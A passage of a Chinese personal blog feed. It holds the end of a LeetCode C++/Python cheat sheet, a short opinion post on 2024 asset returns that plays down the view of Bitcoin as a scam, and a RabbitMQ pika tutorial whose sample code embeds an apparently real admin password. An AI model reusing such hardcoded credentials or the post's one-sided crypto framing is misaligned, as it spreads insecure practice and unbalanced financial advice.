class="built_in">top</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>小根堆</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">findKthLargest</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; pq;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">        pq.<span class="built_in">push</span>(nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = k; i &lt; nums.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        pq.<span class="built_in">push</span>(nums[i]);</span><br><span class="line">        pq.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pq.<span class="built_in">top</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="自定义优先级">自定义优先级</span></h2><p>求k个最小距离的点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    struct cmp&#123;</span><br><span class="line">        bool operator() (vector&lt;int&gt; &amp;a, vector&lt;int&gt; &amp;b) &#123;</span><br><span class="line">            int dis1 = a[0] * a[0] + a[1] * a[1];</span><br><span class="line">            int dis2 = b[0] * b[0] + b[1] * b[1];</span><br><span class="line">            return dis1 &gt; dis2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; kClosest(vector&lt;vector&lt;int&gt;&gt;&amp; points, int k) &#123;</span><br><span class="line">        vector&lt;vector&lt;int&gt;&gt; ans;</span><br><span class="line">        priority_queue&lt;vector&lt;int&gt;, vector&lt;vector&lt;int&gt;&gt;, cmp&gt; pq;</span><br><span class="line">        for (auto &amp;vec: points) &#123;</span><br><span class="line">            pq.push(vec);</span><br><span class="line">        &#125;</span><br><span class="line">        for (int i = 0; i &lt; k; ++i) &#123;</span><br><span class="line">            ans.push_back(pq.top());</span><br><span class="line">            pq.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1><span id="集合unordered_set">集合(unordered_set)</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unordered_set&lt;int&gt; s;</span><br><span class="line">s.insert(key);</span><br><span class="line">s.erase(key);</span><br><span class="line">if (s.find(key) != s.end())</span><br></pre></td></tr></table></figure>

<h1><span id="哈希表unordered_map">哈希表(unordered_map)</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unordered_map&lt;int, DLinkedNode*&gt; ht;</span><br><span class="line">ht.erase(key);</span><br></pre></td></tr></table></figure>

<h1><span id="treemap">TreeMap</span></h1><h2><span id="自定义优先级">自定义优先级</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Cmp &#123;</span><br><span class="line">    private:</span><br><span class="line">        const std::vector&lt;int&gt;&amp; data;</span><br><span class="line">    public:</span><br><span class="line">        explicit Cmp(const std::vector&lt;int&gt; &amp;vec) : data(vec) &#123;&#125;</span><br><span class="line">        bool operator()(const int a, const int b) const &#123;</span><br><span class="line">            if (data[a] != data[b]) return data[a] &gt; data[b];</span><br><span class="line">            return a &gt; b;</span><br><span class="line">        &#125;        </span><br><span class="line">&#125;;</span><br><span class="line">vector&lt;int&gt;&amp; nums;</span><br><span class="line">set&lt;int, Cmp&gt; s((Cmp(nums)));</span><br></pre></td></tr></table></figure>

<h1><span id="字符串string">字符串(String)</span></h1><h2><span id="是否包含子串">是否包含子串</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s2是否包含s1</span><br><span class="line">s2.find(s1) != string::npos;</span><br></pre></td></tr></table></figure>

<h2><span id="比较两个字符串的字典序">比较两个字符串的字典序</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s1 &lt; s2</span><br><span class="line">s1.compare(s2) &lt; 0</span><br></pre></td></tr></table></figure>

<h2><span id="整数转字符串">整数转字符串</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string s = to_string(10);</span><br></pre></td></tr></table></figure>

<h2><span id="去除所有空格">去除所有空格</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h2><span id="末尾添加字符">末尾添加字符</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string s;</span><br><span class="line">s.push_back(&#x27;c&#x27;);</span><br></pre></td></tr></table></figure>

<h1><span id="排序">排序</span></h1><h2><span id="自定义排序">自定义排序</span></h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">compare</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;a, vector&lt;<span class="type">int</span>&gt; &amp;b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a[<span class="number">0</span>] &lt; b[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(intervals.<span class="built_in">begin</span>(), intervals.<span class="built_in">end</span>(), compare);</span><br></pre></td></tr></table></figure>

<h2><span id="拓扑排序">拓扑排序</span></h2><p>BFS, 每次把入度为0的点入队列)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;int&gt; degree(size, 0);</span><br><span class="line">vector&lt;vector&lt;int&gt;&gt; graph(size);</span><br><span class="line">queue&lt;int&gt; q;</span><br></pre></td></tr></table></figure>

<h1><span id="并查集">并查集</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;int&gt; parents;</span><br><span class="line">for (int i = 0; i &lt; parents.size(); ++i) parents[i] = i;</span><br><span class="line">void Union(int x, int y) &#123;</span><br><span class="line">	int px = Find(x);</span><br><span class="line">	int py = Find(y);</span><br><span class="line">	if (px == py) return;</span><br><span class="line">	parents[px] = py;</span><br><span class="line">&#125;</span><br><span class="line">int Find(int x) &#123;</span><br><span class="line">	if (x == parents[x]) return x;</span><br><span class="line">	parents[x] = Find(parents[x]);</span><br><span class="line">	return parents[x];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1><span id="字典树">字典树</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct TrieNode &#123;</span><br><span class="line">    vector&lt;TrieNode *&gt; children;</span><br><span class="line">	bool isWordEnd;</span><br><span class="line">    TrieNode() &#123;</span><br><span class="line">        children.resize(26, nullptr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void insert(string word) &#123;</span><br><span class="line">    TrieNode *cur = root;</span><br><span class="line">    for (char ch: word) &#123;</span><br><span class="line">        int idx = ch - &#x27;a&#x27;;</span><br><span class="line">        if (cur-&gt;children[idx] == nullptr) &#123;</span><br><span class="line">            cur-&gt;children[idx] = new TrieNode(ch);</span><br><span class="line">        &#125;</span><br><span class="line">        cur = cur-&gt;children[idx];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool startsWith(string prefix) &#123;</span><br><span class="line">    TrieNode *cur = root;</span><br><span class="line">    for (char ch: prefix) &#123;</span><br><span class="line">        int idx = ch - &#x27;a&#x27;;</span><br><span class="line">        if (cur-&gt;children[idx] == nullptr) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = cur-&gt;children[idx];</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1><span id="单调栈-树状数组">单调栈、树状数组</span></h1><h1><span id="leetcode-python-cheetsheet">LeetCode python CheetSheet</span></h1><h1><span id="自定义排序">自定义排序</span></h1><p>Python匿名函数</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># intervals: List[List[int]])</span></span><br><span class="line">intervals.sort(key=<span class="keyword">lambda</span> p: p[<span class="number">0</span>])</span><br><span class="line">intervals.sort(key=<span class="keyword">lambda</span> p: p[<span class="number">0</span>], reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>Python命名函数排序</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">compare</span>(<span class="params">x, y</span>):</span><br><span class="line">	s1 = <span class="built_in">str</span>(x) + <span class="built_in">str</span>(y)</span><br><span class="line">	s2 = <span class="built_in">str</span>(y) + <span class="built_in">str</span>(x)</span><br><span class="line">	<span class="keyword">if</span> s1 &gt; s2:</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">nums.sort(key=cmp_to_key(compare))</span><br></pre></td></tr></table></figure>

<h1><span id="遍历list">遍历list</span></h1><p>enumerate正向遍历索引和值</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> index,value <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">list</span>):</span><br></pre></td></tr></table></figure>
<p>range逆序遍历 (起始索引(含)，结束索引(不含), 步长)</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">	nums[idx] = ...</span><br></pre></td></tr></table></figure>

<h1><span id="小根堆">小根堆</span></h1><p>Python heapq默认是小根堆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def findKthLargest(self, nums: List[int], k: int) -&gt; int:</span><br><span class="line">        min_heap = []</span><br><span class="line">        for i in range(k):</span><br><span class="line">            heapq.heappush(min_heap, nums[i])</span><br><span class="line">        for i in range(k, len(nums), 1):</span><br><span class="line">            heapq.heappush(min_heap, nums[i])</span><br><span class="line">            heapq.heappop(min_heap)</span><br><span class="line">        return min_heap[0]</span><br></pre></td></tr></table></figure>

<h1><span id="集合set">集合(set)</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = set()</span><br><span class="line">s.add(e)</span><br><span class="line">if e in s:</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>

<h1><span id="队列">队列</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from collections import deque</span><br><span class="line">d = deque()</span><br><span class="line">d = deque([1, 2, 3])</span><br><span class="line"></span><br><span class="line">d.append(4)</span><br><span class="line">d.appendleft(0)</span><br><span class="line">removed_element = d.pop()</span><br><span class="line">removed_element = d.popleft()</span><br><span class="line">d[0]</span><br><span class="line">d[-1]</span><br><span class="line">d.remove(2)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>2024年各类资产近十年收益率</title>
    <url>/2025/0118124850.html</url>
    <content><![CDATA[<p>同花顺做了一张2024年度资产收益图，大家可以看看</p>
<span id="more"></span>
<p><img data-src="/2025/0118124850/image1.png"></p>
<p>我挑几个说</p>
<ul>
<li>今年涨幅第一的是BTC, 收益率156.9%。 除了22年(跌62.1%)和18年(跌71.4%)，其他年份也是排名第一。显然，币圈的造富效应很强，赚大钱的绝不在少数。而我们听到的报道，都是暴跌、归零、庞氏骗局。看到这个收益，你还觉得是骗局吗？</li>
<li>美股今年涨幅36.6%, 长期持有收益非常可观。明年能不能涨不知道，股神巴菲特今年抛售了不少股票，国内几个跟踪美股的ETF溢价也普遍较高。如果能等到一个回调，等这些美股ETF溢价被抹平，到时很可能会是一个不错的加仓机会</li>
<li>A股今年收益13.5%，还算可以了，明年可以继续期待一下。我之前的文章中提到过，A股长期年化回报只有4%，但波动率为25%, 收益和债券一样，但波动是债券的八倍十倍。我再提一点重要的，就是在A股做择时交易非常危险。如果今年的924行情这几天，你阴差阳错地踏空了，估计收益率到现在大概率还是个负数</li>
<li>黄金近两年涨了40%多，这个收益很不错了。 记得早些时候我还写了篇文章说黄金投资价值不如股票，现在看脸被打肿了。 一个人无法赚到他认知以外的钱，这句话说的太TM对了</li>
</ul>
<p>说了这些，希望大家把视野打开，了解到投资不只是A股。时刻保持开放的心态，持续学习，提高自己的姿势水平</p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>RabbitMQ入门教程</title>
    <url>/2025/0205201812.html</url>
    <content><![CDATA[<h2><span id="前言">前言</span></h2><p><a href="https://pcj600.github.io/2024/1218212631.html">Linux安装RabbitMQ</a><br><a href="https://www.rabbitmq.com/tutorials/tutorial-one-python">官方教程</a></p>
<h2><span id="1-hello-rabbitmq">1. Hello RabbitMQ</span></h2><p>使用Python pika客户端, 写一个简单的生产者和消费者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Producer ------&gt; Queue -----&gt; Consumer</span><br></pre></td></tr></table></figure>
<h3><span id="编写producersendpy">编写Producer(send.py)</span></h3><p>先连接Broker, 建立connection和channel</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pika</span><br><span class="line"></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(<span class="string">&#x27;localhost&#x27;</span>))</span><br><span class="line">channel = connection.channel()</span><br></pre></td></tr></table></figure>
<p>接着声明一个队列; 在RabbitMQ中，消息不是直接发送到队列，而是先发送到交换机(exchange), 由交换机发送到队列。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">channel.queue_declare(queue=<span class="string">&#x27;hello&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>使用basic_publish发送消息。 这里使用默认交换机(‘’), routing_key参数指定为队列名称</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">channel.basic_publish(exchange=<span class="string">&#x27;&#x27;</span>, routing_key=<span class="string">&#x27;hello&#x27;</span>, body=<span class="string">&#x27;Hello World!&#x27;</span>)</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>完整的生产者代码(send.py)如下:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pika</span><br><span class="line"></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(host=<span class="string">&#x27;localhost&#x27;</span>, credentials=pika.PlainCredentials(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;V2SG@xdr&#x27;</span>)))</span><br><span class="line">channel = connection.channel()</span><br><span class="line">channel.queue_declare(queue=<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">channel.basic_publish(exchange=<span class="string">&#x27;&#x27;</span>, routing_key=<span class="string">&#x27;hello&#x27;</span>, body=<span class="string">&#x27;Hello World!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; [x] Sent &#x27;Hello World!&#x27;&quot;</span>)</span><br><span class="line">connection.close()</span><br></pre></td></tr></table></figure>

<p>执行成功后，在后台通过<code>rabbitmqadmin</code>查看队列已创建，消息已发送</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rabbitmqctl list_queues</span></span><br><span class="line">Listing queues <span class="keyword">for</span> vhost / ...</span><br><span class="line">name    messages</span><br><span class="line">hello   1</span><br></pre></td></tr></table></figure>

<h3><span id="编写consumerreceivepy">编写Consumer(receive.py)</span></h3><p>和send.py类似，需要先连接Broker，创建Connection和Channel, 再声明队列。<br>通过basic_consume方法接收消息，定义callback消费消息</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> pika, sys, os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    connection = pika.BlockingConnection(pika.ConnectionParameters(host=<span class="string">&#x27;localhost&#x27;</span>, credentials=pika.PlainCredentials(your_username, your_password)))</span><br><span class="line">    channel = connection.channel()</span><br><span class="line">    channel.queue_declare(queue=<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">callback</span>(<span class="params">ch, method, properties, body</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot; [x] Received <span class="subst">&#123;body&#125;</span>&quot;</span>)</span><br><span class="line">		</span><br><span class="line">    channel.basic_consume(queue=<span class="string">&#x27;hello&#x27;</span>, on_message_callback=callback, auto_ack=<span class="literal">True</span>)</span><br><span class="line">	</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27; [*] Waiting for messages. To exit press CTRL+C&#x27;</span>)</span><br><span class="line">    channel.start_consuming()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Interrupted&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">except</span> SystemExit:</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>执行结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 receive.py</span><br><span class="line"> [*] Waiting for messages. To exit press CTRL+C</span><br><span class="line"> [x] Received b&#x27;Hello World!&#x27;</span><br></pre></td></tr></table></figure>

<h2><span id="2-work-queues工作队列">2. Work Queues(工作队列)</span></h2><p>工作队列的概念在web开发中经常用到。 因为短的HTTP请求窗口中难以处理耗时较多的任务。</p>
<p>对Hello RabbitMQ的代码稍作修改，在消费者中通过time.sleep()假设我们在执行一个耗时的任务<br>生产者(new_task.py)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">message = &#x27; &#x27;.join(sys.argv[1:]) or &quot;Hello World!&quot;</span><br><span class="line">channel.basic_publish(exchange=&#x27;&#x27;,</span><br><span class="line">                      routing_key=&#x27;hello&#x27;,</span><br><span class="line">                      body=message)</span><br><span class="line">print(f&quot; [x] Sent &#123;message&#125;&quot;)</span><br></pre></td></tr></table></figure>
<p>消费者(worker.py)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import time</span><br><span class="line"></span><br><span class="line">def callback(ch, method, properties, body):</span><br><span class="line">    print(f&quot; [x] Received &#123;body.decode()&#125;&quot;)</span><br><span class="line">    time.sleep(body.count(b&#x27;.&#x27;))</span><br><span class="line">    print(&quot; [x] Done&quot;)</span><br></pre></td></tr></table></figure>

<h3><span id="round-robin-分发任务">Round-robin 分发任务</span></h3><p>示意图:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                                                       /---------&gt; Consumer 1</span><br><span class="line">Producer -------&gt; Queue --------&gt; Round Robin dispatch</span><br><span class="line">                                                       \---------&gt; Consumer 2</span><br></pre></td></tr></table></figure>
<p>开启两个窗口运行消费者代码(worker.py)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># shell 1</span><br><span class="line">python worker.py</span><br><span class="line"># =&gt; [*] Waiting for messages. To exit press CTRL+C</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># shell 2</span><br><span class="line">python worker.py</span><br><span class="line"># =&gt; [*] Waiting for messages. To exit press CTRL+C</span><br></pre></td></tr></table></figure>

<p>第三个窗口中, 执行生产者代码(new_task.py), 发布5条消息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># shell 3</span></span><br><span class="line">python new_task.py First message.</span><br><span class="line">python new_task.py Second message..</span><br><span class="line">python new_task.py Third message...</span><br><span class="line">python new_task.py Fourth message....</span><br><span class="line">python new_task.py Fifth message.....</span><br></pre></td></tr></table></figure>

<p>查看消费结果, 的确是Round-robin分发任务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># shell 1</span></span><br><span class="line"> [*] Waiting <span class="keyword">for</span> messages. To <span class="built_in">exit</span> press CTRL+C</span><br><span class="line"> [x] Received First message.</span><br><span class="line"> [x] Done</span><br><span class="line"> [x] Received Third message...</span><br><span class="line"> [x] Done</span><br><span class="line"> [x] Received Fifth message.....</span><br><span class="line"> [x] Done</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># shell 2</span><br><span class="line"> [*] Waiting for messages. To exit press CTRL+C</span><br><span class="line"> [x] Received Second message..</span><br><span class="line"> [x] Done</span><br><span class="line"> [x] Received Fourth message....</span><br><span class="line"> [x] Done</span><br></pre></td></tr></table></figure>

<h3><span id="消息确认message-acknowledgments">消息确认(message acknowledgments)</span></h3><p>为了确保消息不丢失, RabbitMQ支持消息确认机制</p>
<ul>
<li>消费者返回一个ACK，告诉RabbitMQ一个特定消息已经被接收或处理, 并且RabbitMQ可以自由删除它</li>
<li>如果一个消费者挂了(连接被关闭T丢失)而没有发送ACK，RabbitMQ就知道这个消息没有被正常处理，将消息重新排队; 如果同时有其他消费者在线，RabbitMQ可以迅速将消息重新交付给另一个消费者, 确保没有信息丢失。</li>
</ul>
<p>这里移除auto_ack&#x3D;True参数, 调用basic_ack进行手动消息确认</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def callback(ch, method, properties, body):</span><br><span class="line">    print(f&quot; [x] Received &#123;body.decode()&#125;&quot;)</span><br><span class="line">    time.sleep(body.count(b&#x27;.&#x27;) )</span><br><span class="line">    print(&quot; [x] Done&quot;)</span><br><span class="line">    ch.basic_ack(delivery_tag = method.delivery_tag)</span><br><span class="line"></span><br><span class="line">channel.basic_consume(queue=&#x27;hello&#x27;, on_message_callback=callback)</span><br></pre></td></tr></table></figure>
<p>注: 消息确认必须在接收消息的同一通道(channel)上发送。 尝试使用不同的通道进行确认将导致异常。</p>
<h3><span id="常见错误-忘记消息确认forgotten-acknowledgments">常见错误 —— 忘记消息确认(Forgotten acknowledgments)</span></h3><p>忘记调用basic_ack做消息确认是一个常见的错误, 且后果很严重。 RabbitMQ会消耗越来越多的内存，因为它不能释放任何未被锁定的消息。<br>通过如下命令诊断”忘记消息确认”错误:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># rabbitmqctl list_queues name messages_ready messages_unacknowledged</span><br><span class="line">+----------------------------------------------+----------+----------------+-------------------------+</span><br><span class="line">|                     name                     | messages | messages_ready | messages_unacknowledged |</span><br><span class="line">+----------------------------------------------+----------+----------------+-------------------------+</span><br><span class="line">| hello                                        | 3        | 3              | 0                       |</span><br><span class="line">+----------------------------------------------+----------+----------------+-------------------------+</span><br></pre></td></tr></table></figure>

<h3><span id="消息持久性">消息持久性</span></h3><p>以上案例中, 如果RabbitMQ服务器停止，消息会丢失。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart rabbitmq-server.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># rabbitmqctl list_queues name messages_ready messages_unacknowledged</span></span><br><span class="line">(重启后队列消失了，消息也丢失了)</span><br><span class="line">+----------------------------------------------+----------+----------------+-------------------------+</span><br><span class="line">|                     name                     | messages | messages_ready | messages_unacknowledged |</span><br><span class="line">+----------------------------------------------+----------+----------------+-------------------------+</span><br><span class="line">+----------------------------------------------+----------+----------------+-------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果我们希望队列在RabbitMQ节点重启后仍然存在，需要同时在生产者和消费者端将队列声明为持久(durable)的，</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">channel.queue_declare(queue=<span class="string">&#x27;hello&#x27;</span>, durable=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>进一步, 如果我们希望消息也是持久的, 需要在basic.publish方法中设置delivery_mode参数为pika.DeliveryMode.Persistent</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">channel.basic_publish(exchange=<span class="string">&#x27;&#x27;</span>, routing_key=<span class="string">&quot;task_queue&quot;</span>, body=message,</span><br><span class="line">                      properties=pika.BasicProperties(</span><br><span class="line">                         delivery_mode = pika.DeliveryMode.Persistent</span><br><span class="line">                      ))</span><br></pre></td></tr></table></figure>
<p>注：将消息标记为持久消息不能完全保证消息不丢失。 RabbitMQ不会对每条消息执行fsync(2)——它可能只是保存到缓存中，而不是真正写入磁盘。</p>
<h3><span id="公平调度">公平调度</span></h3><p>例如有两个worker，所有奇数消息复杂, 处理很慢，而偶数消息很快处理完了。 Round-Robin策略仍然会均匀分发消息，没有考虑worker的负载。<br>这里采用一种公平调度的策略, 通过<code>basic_qos</code>方法, 告诉RabbitMQ不要一次给某一个worker发太多的消息; 如果某个worker正在处理前一条消息, 还没有发送确认，就不要给这个worker再发消息。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">channel.basic_qos(prefetch_count=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>完整代码如下:<br>new_task.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pika, sys</span><br><span class="line"></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(host=<span class="string">&#x27;localhost&#x27;</span>, credentials=pika.PlainCredentials(your_username, your_password)))</span><br><span class="line"></span><br><span class="line">channel = connection.channel()</span><br><span class="line"></span><br><span class="line">channel.queue_declare(queue=<span class="string">&#x27;task_queue&#x27;</span>, durable=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="string">&#x27; &#x27;</span>.join(sys.argv[<span class="number">1</span>:]) <span class="keyword">or</span> <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line">channel.basic_publish(</span><br><span class="line">    exchange=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    routing_key=<span class="string">&#x27;task_queue&#x27;</span>,</span><br><span class="line">    body=message,</span><br><span class="line">    properties=pika.BasicProperties(</span><br><span class="line">        delivery_mode=pika.DeliveryMode.Persistent</span><br><span class="line">    ))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot; [x] Sent <span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br><span class="line">connection.close()</span><br></pre></td></tr></table></figure>
<p>worker.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pika</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(host=&#x27;localhost&#x27;, credentials=pika.PlainCredentials(your_username, your_password)))</span><br><span class="line">channel = connection.channel()</span><br><span class="line"></span><br><span class="line">channel.queue_declare(queue=&#x27;task_queue&#x27;, durable=True)</span><br><span class="line">print(&#x27; [*] Waiting for messages. To exit press CTRL+C&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def callback(ch, method, properties, body):</span><br><span class="line">    print(f&quot; [x] Received &#123;body.decode()&#125;&quot;)</span><br><span class="line">    time.sleep(body.count(b&#x27;.&#x27;))</span><br><span class="line">    print(&quot; [x] Done&quot;)</span><br><span class="line">    ch.basic_ack(delivery_tag=method.delivery_tag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">channel.basic_qos(prefetch_count=1)</span><br><span class="line">channel.basic_consume(queue=&#x27;task_queue&#x27;, on_message_callback=callback)</span><br><span class="line"></span><br><span class="line">channel.start_consuming()</span><br></pre></td></tr></table></figure>

<p>验证: 发多条消息，其中第一条消息设置很长的耗时，让consumer 1处理, 紧接着再发几条耗时较短消息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">producer 1</span><br><span class="line"># python new_task.py First message........................................................</span><br><span class="line"> [x] Sent First message........................................................</span><br><span class="line"># python new_task.py Second message..</span><br><span class="line"> [x] Sent Second message..</span><br><span class="line"># python new_task.py Third message...</span><br></pre></td></tr></table></figure>
<p>可以观察到RabbitMQ把除了第一条的消息都传给了consumer 2处理, 使用了fair dispatch策略</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">consumer 1</span><br><span class="line">[x] Received First message........................................................</span><br><span class="line">[x] Done</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">consumer 2</span><br><span class="line"> [x] Received Second message..</span><br><span class="line"> [x] Done</span><br><span class="line"> [x] Received Third message...</span><br><span class="line"> [x] Done</span><br></pre></td></tr></table></figure>

<h2><span id="发布x2f订阅publishx2fsubscribe">发布&#x2F;订阅(Publish&#x2F;Subscribe)</span></h2><p>之前的例子中，每个任务只会发送给一个消费者。 这一届介绍如何向多个消费者传递消息，这种模式称为发布订阅</p>
<p>示例: 一个简单的日志系统，一个生产者发布日志消息, 广播给所有消费者, 消费者接收并打印日志</p>
<h3><span id="exchanges交换机">Exchanges(交换机)</span></h3><p>RabbitMQ消息模型的核心思想是: 发布者从不直接把消息发送到某个队列; 发布者只能把消息发送到某个交换机(Exchange)。<br>交换机的概念很简单: 一边从生产者接收消息，另一边把消息发送给队列</p>
